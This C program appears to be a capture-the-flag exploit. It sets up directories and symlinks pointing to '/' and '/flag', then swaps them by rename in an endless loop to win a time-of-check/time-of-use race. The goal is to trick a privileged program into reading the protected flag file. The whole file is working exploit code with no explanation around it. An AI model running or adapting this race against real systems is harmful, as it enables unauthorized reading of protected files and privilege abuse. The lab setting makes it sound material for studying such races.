#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <errno.h>

// Helper function to remove a file or directory and its contents
void remove_directory(const char *path) {
    struct dirent *entry;
    DIR *dir = opendir(path);

    if (dir == NULL) {
        // If the directory doesn't exist, just return
        if (errno == ENOENT) return;
        perror("opendir");
        exit(EXIT_FAILURE);
    }

    // Recursively remove contents
    while ((entry = readdir(dir)) != NULL) {
        char full_path[256];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        if (entry->d_type == DT_DIR) {
            // Recurse into subdirectory
            remove_directory(full_path);
        } else {
            // Remove file
            if (unlink(full_path) == -1) {
                perror("unlink");
                exit(EXIT_FAILURE);
            }
        }
    }

    closedir(dir);

    // Remove the directory itself
    if (rmdir(path) == -1) {
        perror("rmdir");
        exit(EXIT_FAILURE);
    }
}

// Helper function to create a directory and handle errors
void create_directory(const char *path) {
    if (mkdir(path, 0755) == -1) {
        perror("mkdir");
        exit(EXIT_FAILURE);
    }
}

// Helper function to create a file with specified contents
void create_file_with_contents(const char *path, const char *content) {
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }
    if (write(fd, content, strlen(content)) == -1) {
        perror("write");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);
}

// Helper function to create a symlink and handle errors
void create_symlink(const char *target, const char *linkpath) {
    if (symlink(target, linkpath) == -1) {
        perror("symlink");
        exit(EXIT_FAILURE);
    }
}

// Main program
int main() {
    // Remove existing directories/files
    //remove_directory("aaa");
    //remove_directory("bbb");
    //remove_directory("ccc");
    //remove_directory("maze");

    // Step 2: Create "aaa" directory with "race" file containing "TEST"
    create_directory("aaa");
    create_file_with_contents("aaa/race", "TEST");

    // Step 3: Create "bbb" as a symlink to "/"
    create_symlink("/", "bbb");

    // Step 4: Create "ccc" directory with "race" symlink to "/flag"
    create_directory("ccc");
    create_symlink("/flag", "ccc/race");

    // Step 5: Create "maze" directory
    create_directory("maze");

    // Step 6: Swapping in a loop
    while (1) {
        if (rename("aaa", "temp") == -1 || rename("maze", "aaa") == -1 || rename("temp", "maze") == -1) {
            perror("rename swap aaa");
            exit(EXIT_FAILURE);
        }
        if (rename("bbb", "temp") == -1 || rename("maze", "bbb") == -1 || rename("temp", "maze") == -1) {
            perror("rename swap bbb");
            exit(EXIT_FAILURE);
        }
        if (rename("ccc", "temp") == -1 || rename("maze", "ccc") == -1 || rename("temp", "maze") == -1) {
            perror("rename swap ccc");
            exit(EXIT_FAILURE);
        }
    }

    return 0;
}
